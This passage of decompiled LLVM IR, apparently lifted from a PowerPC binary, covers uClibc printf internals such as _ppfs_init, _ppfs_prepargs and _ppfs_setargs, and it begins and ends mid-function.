  br i1 %v4_10008d18, label %dec_label_pc_10008d20, label %dec_label_pc_10008e14

dec_label_pc_10008d20:                            ; preds = %dec_label_pc_10008d08
  br label %dec_label_pc_10008d24

dec_label_pc_10008d24:                            ; preds = %dec_label_pc_10008cfc, %dec_label_pc_10008d20
  %v0_10008d28 = load i32, i32* %r24.global-to-local, align 4
  %v0_10008d30 = load i32, i32* @r27, align 4
  %v2_10008d30 = add i32 %v0_10008d30, ptrtoint (i32* @global_var_10012930.580 to i32)
  store i32 268471608, i32* @lr, align 4
  %v2_10008d34 = call i32 @__GI_fputs_unlocked(i32 %v2_10008d30, i32 %v0_10008d28)
  %v0_10008d40 = load i32, i32* @r29, align 4
  store i32 268471624, i32* @lr, align 4
  %v4_10008d44 = call i32 @_charpad(i32 %v0_10008d28, i8 48, i32 %v0_10008d40)
  %v1_10008d48 = load i32, i32* @r29, align 4
  %v4_10008d48 = icmp eq i32 %v4_10008d44, %v1_10008d48
  br i1 %v4_10008d48, label %dec_label_pc_10008d50, label %dec_label_pc_10008e14

dec_label_pc_10008d50:                            ; preds = %dec_label_pc_10008d24
  %v3_10008d50 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_10008d50, i32* %r0.global-to-local, align 4
  %v3_10008d54 = icmp eq i32 %v3_10008d50, 0
  br i1 %v3_10008d54, label %dec_label_pc_10008d5c, label %dec_label_pc_10008d84

dec_label_pc_10008d5c:                            ; preds = %dec_label_pc_10008d50
  %v0_10008d5c = load i32, i32* @r31, align 4
  %v3_10008d5c = icmp eq i32 %v0_10008d5c, 0
  br i1 %v3_10008d5c, label %dec_label_pc_10008d78.thread, label %dec_label_pc_10008d78

dec_label_pc_10008d78.thread:                     ; preds = %dec_label_pc_10008d5c
  br label %dec_label_pc_10008de8

dec_label_pc_10008d78:                            ; preds = %dec_label_pc_10008d5c
  %v0_10008d68 = load i32, i32* @r30, align 4
  %v0_10008d70 = load i32, i32* %r24.global-to-local, align 4
  store i32 268471672, i32* @lr, align 4
  %v4_10008d74 = inttoptr i32 %v0_10008d70 to i16*
  %v5_10008d74 = call i32 @__stdio_fwrite(i32 %v0_10008d68, i32 %v0_10008d5c, i16* %v4_10008d74)
  %v1_10008d78.pre = load i32, i32* @r31, align 4
  %v4_10008d78 = icmp eq i32 %v5_10008d74, %v1_10008d78.pre
  br i1 %v4_10008d78, label %dec_label_pc_10008de8, label %dec_label_pc_10008e14

dec_label_pc_10008d84:                            ; preds = %dec_label_pc_10008d50
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_10008dc8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008dc8

dec_label_pc_10008d90:                            ; preds = %dec_label_pc_10008dc8
  %tmp78 = icmp ult i32 %v0_10008de0, 129
  br i1 %tmp78, label %dec_label_pc_10008d98, label %dec_label_pc_10008d94

dec_label_pc_10008d94:                            ; preds = %dec_label_pc_10008d90
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_10008d98

dec_label_pc_10008d98:                            ; preds = %dec_label_pc_10008d90, %dec_label_pc_10008d94
  store i32 ptrtoint (i32* @global_var_10008d9c.581 to i32), i32* @lr, align 4
  %v0_10008d98 = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_10008d98, i32* @r30, align 4
  %v3_10008da0 = icmp eq i32 %v0_10008d98, 0
  br i1 %v3_10008da0, label %dec_label_pc_10008dbc, label %dec_label_pc_10008db4

dec_label_pc_10008db4:                            ; preds = %dec_label_pc_10008d98
  %v0_10008da4 = load i32, i32* %r24.global-to-local, align 4
  store i32 268471736, i32* @lr, align 4
  %v3_10008db4 = inttoptr i32 %v0_10008da4 to i16*
  %v4_10008db4 = call i32 @__stdio_fwrite(i32 %v2_10008c78, i32 %v0_10008d98, i16* %v3_10008db4)
  store i32 %v4_10008db4, i32* %r0.global-to-local, align 4
  %v1_10008dbc.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10008dbc

dec_label_pc_10008dbc:                            ; preds = %dec_label_pc_10008d98, %dec_label_pc_10008db4
  %v1_10008dbc = phi i32 [ 0, %dec_label_pc_10008d98 ], [ %v1_10008dbc.pre, %dec_label_pc_10008db4 ]
  %v0_10008dc0 = phi i32 [ 0, %dec_label_pc_10008d98 ], [ %v4_10008db4, %dec_label_pc_10008db4 ]
  %v4_10008dbc = icmp eq i32 %v0_10008dc0, %v1_10008dbc
  %v1_10008dc0 = load i32, i32* @r31, align 4
  %v2_10008dc0 = sub i32 %v1_10008dc0, %v0_10008dc0
  store i32 %v2_10008dc0, i32* @r31, align 4
  br i1 %v4_10008dbc, label %dec_label_pc_10008dc8, label %dec_label_pc_10008e14

dec_label_pc_10008dc8:                            ; preds = %dec_label_pc_10008dbc, %dec_label_pc_10008d84
  %v0_10008de0 = phi i32 [ %v2_10008dc0, %dec_label_pc_10008dbc ], [ %v0_10008dc8.pre, %dec_label_pc_10008d84 ]
  %v3_10008dc8 = icmp eq i32 %v0_10008de0, 0
  store i32 %v2_10008c78, i32* @r29, align 4
  store i32 %v2_10008b98, i32* @r4, align 4
  store i32 %v2_10008b9c, i32* @r6, align 4
  store i32 %v2_10008c78, i32* @r3, align 4
  store i32 %v0_10008de0, i32* @r5, align 4
  br i1 %v3_10008dc8, label %dec_label_pc_10008de8, label %dec_label_pc_10008d90

dec_label_pc_10008de8:                            ; preds = %dec_label_pc_10008dc8, %dec_label_pc_10008d78.thread, %dec_label_pc_10008d78
  %v0_10008de8 = load i32, i32* %r24.global-to-local, align 4
  %v0_10008df0 = load i32, i32* @r28, align 4
  store i32 268471800, i32* @lr, align 4
  %v4_10008df4 = call i32 @_charpad(i32 %v0_10008de8, i8 32, i32 %v0_10008df0)
  %v1_10008df8 = load i32, i32* @r28, align 4
  %v4_10008df8 = icmp eq i32 %v4_10008df4, %v1_10008df8
  br i1 %v4_10008df8, label %dec_label_pc_10008e00, label %dec_label_pc_10008e14

dec_label_pc_10008e00:                            ; preds = %dec_label_pc_10008de8, %dec_label_pc_10008b50, %dec_label_pc_10008924
  %stack_var_-184.2 = phi i32 [ %v0_10008a58, %dec_label_pc_10008924 ], [ %stack_var_-184.1, %dec_label_pc_10008de8 ], [ %v0_10008a58, %dec_label_pc_10008b50 ]
  %v3_10008e00 = load i8*, i8** %stack_var_-200, align 4
  %v4_10008e00 = ptrtoint i8* %v3_10008e00 to i32
  store i32 %v4_10008e00, i32* @r29, align 4
  br label %dec_label_pc_10008e04

dec_label_pc_10008e04:                            ; preds = %dec_label_pc_10008818, %dec_label_pc_10008e00
  %v0_10008e04 = phi i32 [ %v0_10008e04.pre, %dec_label_pc_10008818 ], [ %v4_10008e00, %dec_label_pc_10008e00 ]
  %v0_10008a58 = phi i32 [ %tmp56, %dec_label_pc_10008818 ], [ %stack_var_-184.2, %dec_label_pc_10008e00 ]
  br label %dec_label_pc_10008830

dec_label_pc_10008e14:                            ; preds = %dec_label_pc_10008c6c, %dec_label_pc_10008de8, %dec_label_pc_10008d78, %dec_label_pc_10008d24, %dec_label_pc_10008d08, %dec_label_pc_10008bc8, %dec_label_pc_10008b98, %dec_label_pc_10008b2c, %dec_label_pc_1000886c, %dec_label_pc_10008dbc
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10008e18

dec_label_pc_10008e18:                            ; preds = %dec_label_pc_10008878, %dec_label_pc_100087f0, %dec_label_pc_10008808, %dec_label_pc_10008e14
  store i32 %v0_100087c4, i32* %r0.global-to-local, align 4
  %v0_10008e1c = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_10008e1c

; uselistorder directives
  uselistorder i32 %v0_10008a58, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_10008de0, { 1, 2, 0 }
  uselistorder i32 %v1_10008cf4, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_10008c84, { 1, 0 }
  uselistorder i32 %v2_10008c14, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10008b74, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10008a58, { 1, 0 }
  uselistorder i32 %v6_10008a10, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v1_100089e0, { 1, 0 }
  uselistorder i32 %v1_10008984, { 1, 0 }
  uselistorder i1 %v2_10008978, { 1, 0 }
  uselistorder i32 %v0_10008928, { 1, 0, 2 }
  uselistorder i32 %v1_10008914, { 1, 0 }
  uselistorder i32 %v0_1000890c, { 1, 0 }
  uselistorder i32 %v1_10008908, { 1, 0 }
  uselistorder i32 %v1_10008884, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000884c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000885c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_10008c78, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_100088c0, { 1, 2, 0 }
  uselistorder i32 %v4_100088b8, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 0, 37, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i8 32, { 2, 1, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_10008e18, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10008e14, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10008e04, { 1, 0 }
  uselistorder label %dec_label_pc_10008de8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10008dbc, { 1, 0 }
  uselistorder label %dec_label_pc_10008d98, { 1, 0 }
  uselistorder label %dec_label_pc_10008d24, { 1, 0 }
  uselistorder label %dec_label_pc_10008cfc, { 1, 0 }
  uselistorder label %dec_label_pc_10008ce4, { 1, 0 }
  uselistorder label %dec_label_pc_10008cd0, { 1, 0 }
  uselistorder label %dec_label_pc_10008cb0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10008cb0thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10008ca4, { 1, 0 }
  uselistorder label %dec_label_pc_10008c34, { 1, 0 }
  uselistorder label %dec_label_pc_10008c20, { 1, 0 }
  uselistorder label %dec_label_pc_10008b98, { 1, 0 }
  uselistorder label %dec_label_pc_10008ae8, { 1, 0 }
  uselistorder label %dec_label_pc_10008ad0, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_10008a80, { 1, 0 }
  uselistorder label %dec_label_pc_10008a64, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_100089f0, { 1, 0 }
  uselistorder label %dec_label_pc_100089d4, { 1, 0 }
  uselistorder label %dec_label_pc_100089c0, { 1, 0 }
  uselistorder label %dec_label_pc_100089bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008990, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008918, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10008904.dec_label_pc_10008904_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_100088dc, { 1, 0 }
  uselistorder label %dec_label_pc_10008878, { 1, 0 }
  uselistorder label %dec_label_pc_1000886c, { 1, 0 }
  uselistorder label %dec_label_pc_10008830, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10008e34 = load i32, i32* @lr, align 4
  store i32 %v0_10008e34, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10008e44 = load i32, i32* @r4, align 4
  store i32 %v0_10008e44, i32* @r30, align 4
  store i32 268471892, i32* @lr, align 4
  %v3_10008e50 = call i32 @__GI_memset(i32 0, i32 160, i32 160)
  %v0_10008e54 = load i32, i32* @r31, align 4
  %v1_10008e54 = add i32 %v0_10008e54, 24
  %v2_10008e54 = inttoptr i32 %v1_10008e54 to i32*
  %v3_10008e54 = load i32, i32* %v2_10008e54, align 4
  store i32 %v3_10008e54, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_10008e5c = load i32, i32* @r30, align 4
  %v2_10008e5c = inttoptr i32 %v0_10008e54 to i32*
  store i32 %v0_10008e5c, i32* %v2_10008e5c, align 4
  %v0_10008e60 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10008e60, i32* %ctr.global-to-local, align 4
  %v0_10008e64 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008e64 = add i32 %v0_10008e64, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10008e6c = load i32, i32* @r31, align 4
  %v2_10008e6c = add i32 %v1_10008e6c, 24
  %v3_10008e6c = inttoptr i32 %v2_10008e6c to i32*
  store i32 %v1_10008e64, i32* %v3_10008e6c, align 4
  %v0_10008e70 = load i32, i32* @r31, align 4
  %v1_10008e70 = add i32 %v0_10008e70, 40
  store i32 %v1_10008e70, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008e74

dec_label_pc_10008e74:                            ; preds = %dec_label_pc_10008e74, %entry
  %v1_10008e74 = phi i32 [ %v1_10008e78, %dec_label_pc_10008e74 ], [ %v1_10008e70, %entry ]
  %v0_10008e74 = load i32, i32* %r0.global-to-local, align 4
  %v2_10008e74 = inttoptr i32 %v1_10008e74 to i32*
  store i32 %v0_10008e74, i32* %v2_10008e74, align 4
  %v0_10008e78 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008e78 = add i32 %v0_10008e78, 4
  store i32 %v1_10008e78, i32* %r9.global-to-local, align 4
  %v0_10008e7c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008e7c = add i32 %v0_10008e7c, -1
  store i32 %v1_10008e7c, i32* %ctr.global-to-local, align 4
  %v2_10008e7c = icmp eq i32 %v1_10008e7c, 0
  br i1 %v2_10008e7c, label %dec_label_pc_10008e80, label %dec_label_pc_10008e74

dec_label_pc_10008e80:                            ; preds = %dec_label_pc_10008e74
  %v0_10008e80 = load i32, i32* @r30, align 4
  br label %dec_label_pc_10008ec0

dec_label_pc_10008e90:                            ; preds = %dec_label_pc_10008ec0
  %v3_10008ec8 = icmp eq i8 %v2_10008ec0, 37
  br i1 %v3_10008ec8, label %dec_label_pc_10008e94, label %dec_label_pc_10008ebc

dec_label_pc_10008e94:                            ; preds = %dec_label_pc_10008e90
  %v1_10008e94 = add i32 %v0_10008e94, 1
  %v2_10008e94 = inttoptr i32 %v1_10008e94 to i8*
  %v3_10008e94 = load i8, i8* %v2_10008e94, align 1
  %v4_10008e94 = zext i8 %v3_10008e94 to i32
  store i32 %v4_10008e94, i32* %r0.global-to-local, align 4
  store i32 %v1_10008e94, i32* %r9.global-to-local, align 4
  %v3_10008e9c = icmp eq i8 %v3_10008e94, 37
  br i1 %v3_10008e9c, label %dec_label_pc_10008ebc, label %dec_label_pc_10008ea4

dec_label_pc_10008ea4:                            ; preds = %dec_label_pc_10008e94
  %v0_10008e98 = load i32, i32* @r31, align 4
  %v2_10008ea4 = inttoptr i32 %v0_10008e98 to i32*
  store i32 %v1_10008e94, i32* %v2_10008ea4, align 4
  store i32 268471980, i32* @lr, align 4
  %v1_10008ea8 = load i32, i32* %r9.global-to-local, align 4
  %v3_10008ea8 = call i32 @_ppfs_parsespec(i32* %v2_10008ea4, i32 %v1_10008ea8)
  %v1_10008eac = icmp slt i32 %v3_10008ea8, 0
  br i1 %v1_10008eac, label %dec_label_pc_10008ed8, label %dec_label_pc_10008eb4

dec_label_pc_10008eb4:                            ; preds = %dec_label_pc_10008ea4
  %v0_10008eb4 = load i32, i32* @r31, align 4
  %v1_10008eb4 = inttoptr i32 %v0_10008eb4 to i32*
  %v2_10008eb4 = load i32, i32* %v1_10008eb4, align 4
  br label %dec_label_pc_10008ec0

dec_label_pc_10008ebc:                            ; preds = %dec_label_pc_10008e90, %dec_label_pc_10008e94
  %v0_10008ebc = phi i32 [ %v0_10008e94, %dec_label_pc_10008e90 ], [ %v1_10008e94, %dec_label_pc_10008e94 ]
  %v1_10008ebc = add i32 %v0_10008ebc, 1
  br label %dec_label_pc_10008ec0

dec_label_pc_10008ec0:                            ; preds = %dec_label_pc_10008eb4, %dec_label_pc_10008ebc, %dec_label_pc_10008e80
  %v0_10008e94 = phi i32 [ %v0_10008e80, %dec_label_pc_10008e80 ], [ %v1_10008ebc, %dec_label_pc_10008ebc ], [ %v2_10008eb4, %dec_label_pc_10008eb4 ]
  store i32 %v0_10008e94, i32* %r9.global-to-local, align 4
  %v1_10008ec0 = inttoptr i32 %v0_10008e94 to i8*
  %v2_10008ec0 = load i8, i8* %v1_10008ec0, align 1
  %v3_10008ec0 = zext i8 %v2_10008ec0 to i32
  store i32 %v3_10008ec0, i32* %r0.global-to-local, align 4
  %v3_10008ec4 = icmp eq i8 %v2_10008ec0, 0
  br i1 %v3_10008ec4, label %dec_label_pc_10008ed0, label %dec_label_pc_10008e90

dec_label_pc_10008ed0:                            ; preds = %dec_label_pc_10008ec0
  %v0_10008ed0 = load i32, i32* @r30, align 4
  %v1_10008ed0 = load i32, i32* @r31, align 4
  %v2_10008ed0 = inttoptr i32 %v1_10008ed0 to i32*
  store i32 %v0_10008ed0, i32* %v2_10008ed0, align 4
  br label %dec_label_pc_10008ed8

dec_label_pc_10008ed8:                            ; preds = %dec_label_pc_10008ea4, %dec_label_pc_10008ed0
  %storemerge = phi i32 [ 0, %dec_label_pc_10008ed0 ], [ -1, %dec_label_pc_10008ea4 ]
  store i32 %v0_10008e34, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_10008ec0, { 1, 2, 0 }
  uselistorder i32 %v0_10008e94, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10008e7c, { 1, 0 }
  uselistorder i32 %v1_10008e78, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_10008ed8, { 1, 0 }
  uselistorder label %dec_label_pc_10008ec0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008ebc, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10008eec = load i32, i32* @lr, align 4
  %v0_10008ef4 = load i32, i32* @r3, align 4
  store i32 %v0_10008ef4, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10008f10 = add i32 %v0_10008ef4, 24
  %v2_10008f10 = inttoptr i32 %v1_10008f10 to i32*
  %v3_10008f10 = load i32, i32* %v2_10008f10, align 4
  store i32 %v3_10008f10, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_10008f10, 1
  br i1 %tmp4, label %dec_label_pc_10008f34, label %dec_label_pc_10008f1c

dec_label_pc_10008f1c:                            ; preds = %entry
  %v2_10008f1c = add i32 %v0_10008ef4, 8
  %v3_10008f1c = inttoptr i32 %v2_10008f1c to i32*
  store i32 0, i32* %v3_10008f1c, align 4
  %v0_10008f20 = load i32, i32* @r30, align 4
  %v1_10008f20 = load i32, i32* @r3, align 4
  %v2_10008f20 = add i32 %v1_10008f20, 28
  %v3_10008f20 = inttoptr i32 %v2_10008f20 to i32*
  store i32 %v0_10008f20, i32* %v3_10008f20, align 4
  %v0_10008f24 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008f24 = load i32, i32* @r3, align 4
  %v2_10008f24 = add i32 %v1_10008f24, 24
  %v3_10008f24 = inttoptr i32 %v2_10008f24 to i32*
  store i32 %v0_10008f24, i32* %v3_10008f24, align 4
  %v0_10008f28 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008f28 = load i32, i32* @r3, align 4
  %v2_10008f28 = add i32 %v1_10008f28, 4
  %v3_10008f28 = inttoptr i32 %v2_10008f28 to i32*
  store i32 %v0_10008f28, i32* %v3_10008f28, align 4
  store i32 268472112, i32* @lr, align 4
  %v0_10008f2c = call i32 @_ppfs_setargs()
  store i32 %v0_10008f2c, i32* %r3.global-to-local, align 4
  %v0_10008f30 = load i32, i32* @r30, align 4
  %v1_10008f30 = load i32, i32* @r31, align 4
  %v2_10008f30 = add i32 %v1_10008f30, 24
  %v3_10008f30 = inttoptr i32 %v2_10008f30 to i32*
  store i32 %v0_10008f30, i32* %v3_10008f30, align 4
  %v0_10008f44.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008f34

dec_label_pc_10008f34:                            ; preds = %entry, %dec_label_pc_10008f1c
  %v0_10008f44 = phi i32 [ %v0_10008ef4, %entry ], [ %v0_10008f44.pre, %dec_label_pc_10008f1c ]
  store i32 %v0_10008eec, i32* %r0.global-to-local, align 4
  ret i32 %v0_10008f44

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_10008f34, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10008f48 = load i32, i32* @r3, align 4
  %v1_10008f48 = add i32 %v0_10008f48, 24
  %v2_10008f48 = inttoptr i32 %v1_10008f48 to i32*
  %v3_10008f48 = load i32, i32* %v2_10008f48, align 4
  store i32 %v3_10008f48, i32* %r0.global-to-local, align 4
  %v1_10008f4c = add i32 %v0_10008f48, 88
  store i32 %v1_10008f4c, i32* @r8, align 4
  %v1_10008f50 = add i32 %v0_10008f48, 8
  %v2_10008f50 = inttoptr i32 %v1_10008f50 to i32*
  %v3_10008f50 = load i32, i32* %v2_10008f50, align 4
  store i32 %v3_10008f50, i32* %r9.global-to-local, align 4
  %v2_10008f54 = icmp sgt i32 %v3_10008f48, 0
  %v3_10008f54 = icmp eq i32 %v3_10008f48, 0
  store i1 %v2_10008f54, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10008f54, label %dec_label_pc_10008f5c, label %dec_label_pc_10009148

dec_label_pc_10008f5c:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_10008f60 = icmp ne i32 %v3_10008f50, -2147483648
  %v4_10008f60 = icmp eq i32 %v3_10008f50, -2147483648
  store i1 %v3_10008f60, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10008f60, label %dec_label_pc_10008f68, label %dec_label_pc_10008fa8

dec_label_pc_10008f68:                            ; preds = %dec_label_pc_10008f5c
  %v1_10008f68 = add i32 %v0_10008f48, 76
  %v2_10008f68 = inttoptr i32 %v1_10008f68 to i8*
  %v3_10008f68 = load i8, i8* %v2_10008f68, align 1
  %v4_10008f68 = zext i8 %v3_10008f68 to i32
  store i32 %v4_10008f68, i32* %r10.global-to-local, align 4
  store i32 %v1_10008f68, i32* %r11.global-to-local, align 4
  %v2_10008f70 = icmp ugt i8 %v3_10008f68, 8
  store i1 %v2_10008f70, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_10008f68, 7
  br i1 %tmp, label %dec_label_pc_10008f90, label %dec_label_pc_10008f78

dec_label_pc_10008f78:                            ; preds = %dec_label_pc_10008f68
  %v1_10008f78 = add i32 %v0_10008f48, 84
  %v2_10008f78 = inttoptr i32 %v1_10008f78 to i32*
  %v3_10008f78 = load i32, i32* %v2_10008f78, align 4
  %v1_10008f7c = mul nuw nsw i32 %v4_10008f68, 4
  %v2_10008f80 = add i32 %v3_10008f78, %v1_10008f7c
  store i32 %v2_10008f80, i32* %r9.global-to-local, align 4
  %v1_10008f84 = add nuw nsw i32 %v4_10008f68, 1
  store i32 %v1_10008f84, i32* %r0.global-to-local, align 4
  %v1_10008f88 = trunc i32 %v1_10008f84 to i8
  store i8 %v1_10008f88, i8* %v2_10008f68, align 1
  br label %dec_label_pc_10008f9c

dec_label_pc_10008f90:                            ; preds = %dec_label_pc_10008f68
  %v1_10008f90 = add i32 %v0_10008f48, 80
  %v2_10008f90 = inttoptr i32 %v1_10008f90 to i32*
  %v3_10008f90 = load i32, i32* %v2_10008f90, align 4
  store i32 %v3_10008f90, i32* %r9.global-to-local, align 4
  %v1_10008f94 = add i32 %v3_10008f90, 4
  store i32 %v1_10008f94, i32* %r0.global-to-local, align 4
  store i32 %v1_10008f94, i32* %v2_10008f90, align 4
  br label %dec_label_pc_10008f9c

dec_label_pc_10008f9c:                            ; preds = %dec_label_pc_10008f78, %dec_label_pc_10008f90
  %v0_10008f9c = load i32, i32* %r9.global-to-local, align 4
  %v1_10008f9c = inttoptr i32 %v0_10008f9c to i32*
  %v2_10008f9c = load i32, i32* %v1_10008f9c, align 4
  store i32 %v2_10008f9c, i32* %r0.global-to-local, align 4
  %v1_10008fa0 = load i32, i32* @r8, align 4
  %v2_10008fa0 = inttoptr i32 %v1_10008fa0 to i32*
  store i32 %v2_10008f9c, i32* %v2_10008fa0, align 4
  %v0_10008fa4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008fa4 = load i32, i32* @r3, align 4
  %v2_10008fa4 = add i32 %v1_10008fa4, 8
  %v3_10008fa4 = inttoptr i32 %v2_10008fa4 to i32*
  store i32 %v0_10008fa4, i32* %v3_10008fa4, align 4
  %v0_10008fa8.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10008fa8

dec_label_pc_10008fa8:                            ; preds = %dec_label_pc_10008f5c, %dec_label_pc_10008f9c
  %v2_10008fd8 = phi i32 [ %v0_10008f48, %dec_label_pc_10008f5c ], [ %v0_10008fa8.pre, %dec_label_pc_10008f9c ]
  %v1_10008fa8 = add i32 %v2_10008fd8, 4
  %v2_10008fa8 = inttoptr i32 %v1_10008fa8 to i32*
  %v3_10008fa8 = load i32, i32* %v2_10008fa8, align 4
  store i32 %v3_10008fa8, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_10008fb0 = icmp ne i32 %v3_10008fa8, -2147483648
  %v4_10008fb0 = icmp eq i32 %v3_10008fa8, -2147483648
  store i1 %v3_10008fb0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10008fb0, label %dec_label_pc_10008fb8, label %dec_label_pc_10009138.preheader

dec_label_pc_10008fb8:                            ; preds = %dec_label_pc_10008fa8
  %v1_10008fb8 = add i32 %v2_10008fd8, 76
  %v2_10008fb8 = inttoptr i32 %v1_10008fb8 to i8*
  %v3_10008fb8 = load i8, i8* %v2_10008fb8, align 1
  %v4_10008fb8 = zext i8 %v3_10008fb8 to i32
  store i32 %v4_10008fb8, i32* %r10.global-to-local, align 4
  store i32 %v1_10008fb8, i32* %r11.global-to-local, align 4
  %v2_10008fc0 = icmp ugt i8 %v3_10008fb8, 8
  store i1 %v2_10008fc0, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_10008fb8, 7
  br i1 %tmp22, label %dec_label_pc_10008fe0, label %dec_label_pc_10008fc8

dec_label_pc_10008fc8:                            ; preds = %dec_label_pc_10008fb8
  %v1_10008fc8 = add i32 %v2_10008fd8, 84
  %v2_10008fc8 = inttoptr i32 %v1_10008fc8 to i32*
  %v3_10008fc8 = load i32, i32* %v2_10008fc8, align 4
  %v1_10008fcc = mul nuw nsw i32 %v4_10008fb8, 4
  %v2_10008fd0 = add i32 %v3_10008fc8, %v1_10008fcc
  store i32 %v2_10008fd0, i32* %r9.global-to-local, align 4
  %v1_10008fd4 = add nuw nsw i32 %v4_10008fb8, 1
  store i32 %v1_10008fd4, i32* %r0.global-to-local, align 4
  %v1_10008fd8 = trunc i32 %v1_10008fd4 to i8
  store i8 %v1_10008fd8, i8* %v2_10008fb8, align 1
  br label %dec_label_pc_10008fec

dec_label_pc_10008fe0:                            ; preds = %dec_label_pc_10008fb8
  %v1_10008fe0 = add i32 %v2_10008fd8, 80
